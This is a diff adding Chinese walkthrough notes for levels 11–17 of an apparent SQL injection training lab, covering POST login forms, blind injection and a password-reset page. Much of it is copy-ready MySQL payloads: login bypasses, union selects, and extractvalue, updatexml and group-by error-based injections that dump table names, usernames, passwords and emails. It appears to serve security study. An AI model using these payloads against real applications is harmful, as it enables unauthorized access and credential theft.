@@ -128,3 +128,65 @@ information_schema.tables表示该数据库下的tables表，点表示下一级�
 ~~~
 #### 第十题
 第十关和第九关一样只需要将单引号换成双引号。
+#### 第十一题
+从第十一关开始，可以发现页面就发生变化了，是账户登录页面。那么注入点就在输入框里面。前十关使用的是get请求，参数都体现在url上面，而从十一关开始是post请求，参数是在表单里面。我们可以直接在输入框进行注入就行。并且参数不在是一个还是两个。根据前面的认识我们可以猜测sql语句。大概的形式应该是这样username=参数 and password=参数 ，只是不知道是字符型还是整数型。\
+当我们输入1',出现报错信息。根据报错信息可以推断该sql语句username='参数' and password='参数'\
+知道sql语句我们可以构造一个恒成立的sql语句，看的查询出什么。这里我们使用--+注释就不行，需要换成#来注释， 这个就和我们第一关是一样了。使用联合注入就可以获取数据库信息。\
+1' or 1=1#
+1' union select 1,2#
+#### 第十二题
+当我们输入1'和1时候页面没有反应\
+当我们输入1"的时候页面出现报错信息，就可以知道sql语句是双引号且有括号\
+1" ) or 1=1 #判断是否存在sql注入。
+1" ) union select 1,2#
+#### 第十三题
+十三关和十二关差不多，只需要将双引号换成单引号
+#### 第十四题
+十四关和十一关差不多，只需要将单引号换成双引号
+#### 第十五题
+第十五关和第十一关一样，只是不产生报错信息。这就是明显的布尔盲注。因为还有错误页面和正确页面进行参考
+1' or 1=1#
+#### 第十六题
+1") or 1=1#
+#### 第十七题
+第十七关和前面的关有很大不一样，根据页面展示是一个密码重置页面，也就是说我们已经登录系统了，然后查看我们源码，是根据我们提供的账户名去数据库查看用户名和密码，如果账户名正确那么将密码改成你输入的密码。再执行这条sql语句之前会对输入的账户名进行检查，对输入的特殊字符转义。所以我们能够利用的只有更新密码的sql语句。sql语句之前都是查询，这里有一个update更新数据库里面信息。所以之前的联合注入和布尔盲注以及时间盲注都不能用了。这里我们会用到报错注入。用到三种mysql报错注入，下面都给大家详细写出步骤,大家可以借鉴。
+~~~
+extractvalue报错注入
+1' and (extractvalue(1,concat(0x5c,version(),0x5c)))#    爆版本
+1' and (extractvalue(1,concat(0x5c,database(),0x5c)))#   爆数据库
+ 
+1' and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))#   爆表名
+1' and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x5c)))# 
+ 爆字段名
+ 
+1' and (extractvalue(1,concat(0x5c,(select password from (select password from users where username='admin1') b) ,0x5c)))#      爆字段内容该格式针对mysql数据库。
+1' and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      爆字段内容。
+updatexml报错注入
+123' and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本
+123' and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库
+ 
+ 
+ 
+123' and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名
+123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1))#
+   爆字段名
+ 
+123' and (updatexml(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c),1))#
+爆密码该格式针对mysql数据库。
+爆其他表就可以，下面是爆emails表
+123' and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='emails'),0x5c),1))#
+ 
+1' and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。
+group by报错注入
+123' and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)*2)))#     爆数据库
+123' and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      爆数据库版本
+ 
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#    通过修改limit后面数字一个一个爆表
+1' and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#        爆出所有表
+ 
+1' and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+1' and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#    爆出所有字段名
+ 
+1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username='admin1'),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。
+~~~
+#### 第十八题
